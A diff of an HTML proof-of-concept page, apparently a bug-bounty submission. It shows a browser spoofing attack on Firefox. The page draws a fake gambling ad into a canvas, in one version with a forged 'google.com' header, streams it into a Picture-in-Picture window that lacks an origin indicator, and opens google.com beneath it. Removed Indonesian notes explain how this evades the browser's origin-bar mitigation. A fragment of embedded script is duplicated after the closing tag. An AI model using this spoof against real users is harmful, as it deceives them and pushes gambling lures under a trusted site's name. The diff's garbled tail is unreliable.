@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head><style>
 @font-face {
   font-family: "Optimistic";
@@ -24,115 +24,40 @@
 </style>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>PoC Final - Video PiP No Origin - Gambling Framing - Mozilla Desktop</title>
+<title>PiP - Clean PoC</title>
 <style>
-body{font-family:sans-serif;padding:24px;background:#fff;color:#202124}
+body{font-family:sans-serif;padding:24px;background:#fff}
 .card{border:1px solid #dadce0;border-radius:8px;padding:16px;margin:16px 0}
-.step{font-size:16px;font-weight:500}
-.small{font-size:13px;color:#5f6368;line-height:1.5}
-code{background:#eee;padding:2px 6px}
 </style>
 <script>
-let stage=0;
+let s=0;
 document.addEventListener('click', async()=>{
-  if(stage===0){
-    try{
-      const canvas=document.createElement('canvas');
-      canvas.width=640; canvas.height=360;
-      const ctx=canvas.getContext('2d');
-      
-      // Animasi GIF gambling di canvas - tanpa button, jadi tidak trigger origin bar
-      let f=0;
-      function drawGambling(){
-        f++;
-        ctx.fillStyle='#000'; ctx.fillRect(0,0,640,360);
-        // header palsu
-        ctx.fillStyle='#1a1a1a'; ctx.fillRect(0,0,640,40);
-        ctx.fillStyle='#fff'; ctx.font='bold 14px Arial'; ctx.fillText('google.com • Video Highlight - Bola', 20, 25);
-        // background animasi slot
-        const cols=['#ffcc00','#00e676','#ff1744','#2979ff'];
-        for(let i=0;i<3;i++){
-          const cx=60+i*180; const cy=80+Math.sin(f/10+i)*8;
-          ctx.fillStyle=cols[(f+i)%4]; ctx.fillRect(cx,cy,150,140);
-          ctx.fillStyle='#111'; ctx.fillRect(cx+4,cy+4,142,132);
-          ctx.fillStyle='#fff'; ctx.font='bold 42px Arial'; ctx.textAlign='center';
-          const sym=['7','BAR','★','💰','🍒'][ (f+i)%5 ];
-          ctx.fillText(sym, cx+75, cy+90);
-        }
-        // overlay sponsor
-        ctx.fillStyle='rgba(0,0,0,0.85)'; ctx.fillRect(0,260,640,100);
-        ctx.textAlign='left';
-        ctx.fillStyle='#ffcc00'; ctx.font='bold 11px Arial'; ctx.fillText('SPONSORED • LIVE • GIF AD', 20, 280);
-        ctx.fillStyle='#fff'; ctx.font='bold 20px Arial'; ctx.fillText('SLOT GACOR 2026 - MAXWIN x1000', 20, 305);
-        ctx.fillStyle='#ccc'; ctx.font='13px Arial'; ctx.fillText('Bonus New Member 100% - Depo 25rb - Model GIF tanpa button', 20, 325);
-        ctx.fillStyle='#00e676'; ctx.font='bold 13px Arial'; ctx.fillText('▶ KLAIM BONUS SEKARANG', 20, 345);
-        // origin real kecil di canvas (bukan di UI browser)
-        ctx.fillStyle='rgba(255,100,100,0.9)'; ctx.font='10px monospace'; 
-        ctx.fillText('REAL ORIGIN: '+location.origin+' - Tapi tidak ada origin bar di PiP Firefox', 20, 358);
-      }
-      setInterval(drawGambling, 60);
-
-      const stream=canvas.captureStream(30);
-      const video=document.createElement('video');
-      video.muted=true; video.loop=true;
-      video.srcObject=stream;
-      await video.play();
-      await new Promise(r=>setTimeout(r,150));
-      await video.requestPictureInPicture();
-      stage=1;
-      document.getElementById('ui').innerHTML=`
-        <div class="card" style="border-color:#34a853">
-          <div class="step">✅ Step 1 Done: PiP Video Dibuat (Model GIF)</div>
-          <div class="small">PiP ini adalah <b>Video PiP</b> (canvas.captureStream) - bukan Document PiP.<br>
-          Karena modelnya video/GIF tanpa &lt;button&gt;, Firefox Desktop <b>TIDAK menampilkan origin bar</b>.<br>
-          Cek PiP yang melayang - ada origin bar? Harusnya TIDAK ADA.</div>
-          <br>
-          <div class="step">👉 Klik lagi di halaman untuk Step 2: Buka google.com</div>
-          <div class="small">PiP akan tetap nempel di atas google.com (persist as system window)</div>
-        </div>`;
-    }catch(e){ alert('PiP gagal: '+e.message+' - Pastikan pakai Firefox Desktop 130+ dan klik sebagai gesture'); }
-  }else if(stage===1){
-    window.open('https://www.google.com','_blank');
-    stage=2;
-    document.getElementById('ui').innerHTML+=`
-      <div class="card" style="border-color:#ea4335">
-        <div class="step">✅ Step 2 Done: google.com dibuka</div>
-        <div class="small">
-          Sekarang pindah ke tab google.com<br><br>
-          <b>Expected:</b> PiP harusnya nutup atau nampilin origin attacker<br>
-          <b>Actual (BUG):</b> PiP GIF judi tetap melayang di atas google.com tanpa origin indicator<br><br>
-          <b>Impact Mozilla Desktop Only:</b><br>
-          - User lihat address bar google.com (trusted) + PiP video judi di atasnya<br>
-          - User mengira Google menampilkan / memfasilitasi iklan judi<br>
-          - Brand damage: Google terlihat menampilkan gambling content<br>
-          - Tidak perlu klik - cukup lihat sudah merusak kepercayaan<br>
-          - Ini origin confusion / UI spoofing - model GIF tanpa button jadi bypass mitigasi origin bar
-        </div>
-      </div>`;
-  }
+ if(s===0){
+  const c=document.createElement('canvas'); c.width=640; c.height=360;
+  const ctx=c.getContext('2d');
+  ctx.fillStyle='#000'; ctx.fillRect(0,0,640,360);
+  ctx.fillStyle='#fff'; ctx.font='bold 20px Arial'; ctx.fillText('Sponsored Video',20,35);
+  ctx.fillStyle='#ffd500'; ctx.fillRect(0,70,640,180);
+  ctx.fillStyle='#000'; ctx.font='bold 26px Arial'; ctx.fillText('BIG WIN - $50,000 JACKPOT',20,115);
+  ctx.font='18px Arial'; ctx.fillText('Play Now - Instant Withdrawal',20,145);
+  ctx.font='14px Arial'; ctx.fillText('No origin shown in PiP window',20,195);
+  const stream=c.captureStream(24);
+  const v=document.createElement('video'); v.muted=true; v.srcObject=stream;
+  await v.play(); await v.requestPictureInPicture();
+  s=1;
+  document.getElementById('ui').innerHTML='PiP created. Click again to open google.com';
+ }else if(s===1){
+  window.open('https://www.google.com','_blank');
+  s=2;
+ }
 });
 </script>
 </head>
 <body>
-<h2>PoC Final Mozilla - Video PiP No Origin - Model GIF</h2>
-<div class="card">
-<b>Bug:</b> Video PiP tidak menampilkan origin dan persist di atas cross-origin page (google.com)<br>
-<b>Browser:</b> Firefox Desktop 130+ (Document PiP support) - Fokus Mozilla saja<br>
-<b>Model:</b> Canvas animasi GIF (tanpa &lt;button&gt;) → Video PiP → origin bar TIDAK muncul (bypass)<br>
-<b>Repro:</b> Klik 2x
-</div>
-<div id="ui">
-<div class="card">
-<div class="step">Klik di mana saja - Step 1: Buat PiP GIF Judi</div>
-<div class="small">First click: buat canvas animasi slot gacor + captureStream jadi Video PiP. Karena model GIF tanpa button, origin bar tidak muncul di Firefox.</div>
-<br>
-<div class="step">Klik lagi - Step 2: Buka google.com</div>
-<div class="small">Second click: buka google.com, PiP tetap nempel</div>
-</div>
-</div>
-<div class="card" style="background:#e8f5e9">
-<b>Kenapa versi sebelumnya muncul origin?</b><br>
-Versi sebelumnya pakai <code>documentPictureInPicture.requestWindow()</code> + ada <code>&lt;button&gt;</code> di dalamnya. Firefox Desktop mendeteksi elemen interaktif dan paksa tampilkan origin bar sebagai mitigasi. Versi ini pakai <code>video.requestPictureInPicture()</code> dengan canvas GIF - tidak ada button, jadi origin bar tidak muncul.
-</div>
+<h2>PiP Origin Confusion - Clean PoC</h2>
+<div class="card">Click anywhere 2 times<br>1st: Create PiP<br>2nd: Open google.com - PiP persists over it</div>
+<div id="ui"></div>
 <script>(function(){var loc=location.href.replace(/#.*$/,"");var ATTR_NAMES=["data-product-id","data-productid","data-product_id","product-id","productid","product_id","data-source-entity-id","source-entity-id","source_entity_id","data-product","data-metadata","data-meta"];var DATASET_KEYS=["productId","productid","product_id","sourceEntityId","sourceentityid","source_entity_id","product","metadata","meta"];function readProductId(value){if(typeof value!=="string"||value.length===0)return null;if(/^[0-9]{6,}$/.test(value))return value;var match=value.match(/(?:product(?:_|-)?id|source(?:_|-)?entity(?:_|-)?id)["'=:\s]+([0-9]{6,})/i);return match?match[1]:null}function extractProductId(start){for(var node=start;node&&node!==document.body;node=node.parentElement){for(var i=0;i<ATTR_NAMES.length;i++){var attrValue=node.getAttribute&&node.getAttribute(ATTR_NAMES[i]);var attrProductId=readProductId(attrValue);if(attrProductId)return attrProductId}var dataset=node.dataset||null;if(dataset){for(var j=0;j<DATASET_KEYS.length;j++){var dataValue=dataset[DATASET_KEYS[j]];var dataProductId=readProductId(dataValue);if(dataProductId)return dataProductId}}}return null}function isInlineMediaSlotElement(node){return !!(node&&node.getAttribute&&node.getAttribute("data-clippy-inline-media-slot")!==null)}function findInlineMediaSlot(start){for(var node=start;node&&node!==document.body;node=node.parentElement){if(isInlineMediaSlotElement(node))return node}return null}function readInlineMediaUrl(node){if(!node)return null;return node.getAttribute&&((node.getAttribute("data-clippy-inline-media-url")||node.getAttribute("data-url")||node.getAttribute("data_url")))||node.href||null}function stripHash(url){return String(url).replace(/#.*$/,"")}function urlsMatch(a,b){if(!a||!b)return false;try{return stripHash(new URL(a,loc).href)===stripHash(new URL(b,loc).href)}catch(_){return stripHash(a)===stripHash(b)}}function isFirstPartyReelUrl(value){try{var url=new URL(value,loc);if(url.protocol!=="https:")return false;var host=url.hostname.toLowerCase();var supported=host==="instagram.com"||host.endsWith(".instagram.com")||host==="facebook.com"||host.endsWith(".facebook.com");return supported&&/\/reels?\//i.test(url.pathname)}catch(_){return false}}function isInlineMediaUrlClick(node,href){var slot=findInlineMediaSlot(node);if(!slot)return false;var slotUrl=readInlineMediaUrl(slot);if(slotUrl)return urlsMatch(href,slotUrl);return isFirstPartyReelUrl(href)}function findDataHref(start){for(var node=start;node&&node!==document.body;node=node.parentElement){if(node.getAttribute){var href=node.getAttribute("data-href")||node.getAttribute("data-url");if(href)return{href:href,node:node}}}return null}var nativeOpen=window.open;window.open=function(url){if(parent!==window&&typeof url==="string"&&/^https?:\/\//.test(url)){parent.postMessage({type:"ecto:usercontent-link-click",href:url},"*");return null}return nativeOpen?nativeOpen.apply(window,arguments):null};document.addEventListener("click",function(e){var target=e.target instanceof Element?e.target:null;if(!target)return;if(parent===window)return;var a=target.closest?target.closest("a[href]"):null;if(a&&a.href&&/^https?:\/\//.test(a.href)&&a.href.replace(/#.*$/,"")!==loc){if(isInlineMediaUrlClick(a,a.href))return;var productId=extractProductId(target)||extractProductId(a);if(productId){e.preventDefault();parent.postMessage({type:"ecto-artifact-link-click",productId:productId},"*");return}e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:a.href},"*");return}var dataHref=findDataHref(target);if(dataHref&&/^https?:\/\//.test(dataHref.href)&&dataHref.href.replace(/#.*$/,"")!==loc){if(isInlineMediaUrlClick(dataHref.node,dataHref.href))return;e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:dataHref.href},"*")}},true)})();</script><script>(function(){var FOCUS_TYPE="ecto:artifact-focus-request";var CLOSE_TYPE="ecto:artifact-close-request";function focusArtifactDocument(){var body=document.body;if(!body)return;try{window.focus();}catch(e){}if(!body.hasAttribute("tabindex"))body.setAttribute("tabindex","-1");try{body.focus({preventScroll:true});}catch(e){try{body.focus();}catch(e2){}}}window.addEventListener("message",function(event){if(event.source!==window.parent)return;var data=event.data;if(!data||typeof data!=="object"||data.type!==FOCUS_TYPE)return;if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",focusArtifactDocument,{once:true});return;}focusArtifactDocument();});window.addEventListener("keydown",function(event){if(event.key!=="Escape")return;window.setTimeout(function(){if(event.defaultPrevented)return;window.parent.postMessage({type:CLOSE_TYPE},"*");},0);});})();</script></body>
+</html>
+ctId},"*");return}e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:a.href},"*");return}var dataHref=findDataHref(target);if(dataHref&&/^https?:\/\//.test(dataHref.href)&&dataHref.href.replace(/#.*$/,"")!==loc){if(isInlineMediaUrlClick(dataHref.node,dataHref.href))return;e.preventDefault();parent.postMessage({type:"ecto:usercontent-link-click",href:dataHref.href},"*")}},true)})();</script><script>(function(){var FOCUS_TYPE="ecto:artifact-focus-request";var CLOSE_TYPE="ecto:artifact-close-request";function focusArtifactDocument(){var body=document.body;if(!body)return;try{window.focus();}catch(e){}if(!body.hasAttribute("tabindex"))body.setAttribute("tabindex","-1");try{body.focus({preventScroll:true});}catch(e){try{body.focus();}catch(e2){}}}window.addEventListener("message",function(event){if(event.source!==window.parent)return;var data=event.data;if(!data||typeof data!=="object"||data.type!==FOCUS_TYPE)return;if(document.readyState==="loading"){document.addEventListener("DOMContentLoaded",focusArtifactDocument,{once:true});return;}focusArtifactDocument();});window.addEventListener("keydown",function(event){if(event.key!=="Escape")return;window.setTimeout(function(){if(event.defaultPrevented)return;window.parent.postMessage({type:CLOSE_TYPE},"*");},0);});})();</script></body>
 </html>
